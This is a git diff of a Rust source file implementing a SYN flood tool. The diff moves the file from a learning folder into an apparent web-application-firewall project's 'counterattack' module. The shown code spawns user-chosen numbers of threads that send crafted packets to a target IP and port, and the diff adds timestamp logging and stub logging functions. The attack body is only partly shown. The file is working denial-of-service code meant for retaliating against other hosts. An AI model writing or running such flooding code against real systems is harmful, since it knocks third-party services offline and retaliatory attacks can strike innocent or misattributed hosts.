@@ -1,8 +1,8 @@
 //! @Author       : 白银
 //! @Date         : 2023-01-19 19:33:57
 //! @LastEditors  : 白银
-//! @LastEditTime : 2023-01-20 16:28:41
-//! @FilePath     : /csyx/src/learn/syn_flood.rs
+//! @LastEditTime : 2023-02-14 19:49:58
+//! @FilePath     : /rwaf/src/module/counterattack/syn_flood.rs
 //! @Description  :
 //! @Attention    :
 //! @Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved.
@@ -46,12 +46,18 @@ pub fn start_syn() {
     let mut thread_num = String::new();
     stdin().read_line(&mut thread_num).expect("err");
 
+    let binding = get_date_time();
+    let date_time: Vec<&str> = binding.split("\n").collect();
+    let now_date = date_time.clone()[0]; //get system date
+    let now_time = date_time.clone()[1]; //get system time
+    write_to_counterattack_log_sql();
+
     for _ in 0..thread_num.trim().parse().unwrap() {
         let t = thread::spawn(move || {
             attack(data_count, target, target_port)
             // attack(data_count, get_ipv4_addr(&ipv4_addr_port), get_ipv4_port(&ipv4_addr_port))
         });
-        t.join();
+        // t.join();
     }
 
     // for _ in 0..thread_num.trim().parse().unwrap() {
@@ -175,4 +181,20 @@ fn attack(data_count: i32, target: Ipv4Addr, ipv4_port: i32) {
         // 发送数据包到目标地址
         tx.send_to(packet, std::net::IpAddr::V4(target));
     }
+}
+
+fn get_date_time() -> String {
+    // let mut command = execute::shell("echo $(date +%F%n%T)");
+    let output = Command::new("date").arg("+%F%n%T").output().unwrap();
+    let res = String::from_utf8(output.stdout).unwrap();
+
+    res
+}
+
+fn write_to_webshell_log_sql() {
+    todo!()
+}
+
+fn write_to_counterattack_log_sql() {
+    todo!()
 }
